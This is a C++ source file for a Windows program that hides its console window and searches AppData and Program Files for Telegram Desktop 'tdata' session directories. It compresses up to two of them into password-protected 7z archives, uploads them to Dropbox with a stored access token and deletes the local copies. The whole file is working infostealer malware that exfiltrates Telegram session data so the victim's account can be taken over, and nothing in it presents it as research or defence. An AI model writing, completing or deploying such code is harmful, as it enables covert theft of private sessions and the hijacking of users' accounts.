#include "..\includes.h"
#include <set>

namespace fs = std::filesystem;

std::string WideToUTF8(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();

    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(),
        nullptr, 0, nullptr, nullptr);
    std::string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(),
        &str[0], size_needed, nullptr, nullptr);
    return str;
}

std::string get_appdata_path() {
    char* appdata = std::getenv("APPDATA");
    if (appdata == nullptr) {
        std::cerr << "Failed to get APPDATA environment variable" << std::endl;
        return "";
    }
    return std::string(appdata);
}

std::vector<std::string> check_appdata_telegram_tdata_path() {
    std::set<std::string> unique_paths;
    std::vector<std::string> found_paths;

    std::string appdata_path = get_appdata_path();
    if (appdata_path.empty()) {
        std::cerr << "Unable to retrieve AppData path" << std::endl;
        return found_paths;
    }

    std::cout << appdata_path << std::endl;

    std::string manual_path = appdata_path + "\\Telegram Desktop\\tdata";
    std::cout << "Manually checking: " << manual_path << std::endl;

    if (fs::exists(manual_path)) {
        std::cout << "Found Telegram tdata (AppData) at: " << manual_path << std::endl;
        found_paths.push_back(manual_path);
    }
    else {
        std::cout << "No Telegram tdata found at: " << manual_path << std::endl;
    }

    return found_paths;
}
std::vector<std::string> check_c_drive_telegram_tdata_path() {
    std::set<std::string> unique_paths;
    std::vector<std::string> found_paths;

    const std::vector<std::wstring> program_files_paths = {
        L"C:\\Program Files\\Telegram Desktop\\tdata",
        L"C:\\Program Files (x86)\\Telegram Desktop\\tdata"
    };

    for (const auto& path : program_files_paths) {
        std::string abs_path = fs::absolute(WideToUTF8(path)).string();
        std::wcout << L"Checking: " << path << std::endl;

        if (fs::exists(abs_path) && unique_paths.insert(abs_path).second) {
            std::cout << "Found Telegram tdata (C:) at: " << abs_path << std::endl;
            found_paths.push_back(abs_path);
        }
    }

    return found_paths;
}

int main() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    curl_global_init(CURL_GLOBAL_DEFAULT);
    std::cout << "curl_global_init completed" << std::endl;

    auto appdata_paths = check_appdata_telegram_tdata_path();
    if (appdata_paths.empty()) {
        std::cout << "No Telegram tdata found in AppData directories." << std::endl;
    }

    auto c_drive_paths = check_c_drive_telegram_tdata_path();
    if (c_drive_paths.empty()) {
        std::cout << "No Telegram tdata found on C: drive directories." << std::endl;
    }

    std::vector<std::string> tdata_paths;
    tdata_paths.insert(tdata_paths.end(), appdata_paths.begin(), appdata_paths.end());
    tdata_paths.insert(tdata_paths.end(), c_drive_paths.begin(), c_drive_paths.end());

    if (tdata_paths.empty()) {
        std::cout << "Could not find any Telegram tdata directories" << std::endl;
        curl_global_cleanup();
        return 1;
    }

    int counter = 0;

    std::string randName = Utils::random_string(8);

    for (const auto& tdata_path : tdata_paths) {
        if (counter >= 2) break; 

        std::string temp_zip = std::string(std::getenv("TEMP")) + "\\tdata_" + randName + "_" + std::to_string(counter) + ".7z";
        std::cout << "Using source directory: " << tdata_path << std::endl;

        if (!Utils::create_7z_archive(tdata_path, temp_zip, Settings::ZIP_PASSWORD)) {
            std::cout << "Archive creation failed for: " << tdata_path << std::endl;
            continue; 
        }

        Sleep(5000);

        std::cout << "Archive created successfully: " << temp_zip << std::endl;

        std::string dropbox_url = upload_to_dropbox(temp_zip, Settings::DROPBOX_ACCESS_TOKEN);

        std::remove(temp_zip.c_str());

        ++counter; 
    }

    curl_global_cleanup();

    std::cout << "Process completed successfully." << std::endl;
    return 0;
}
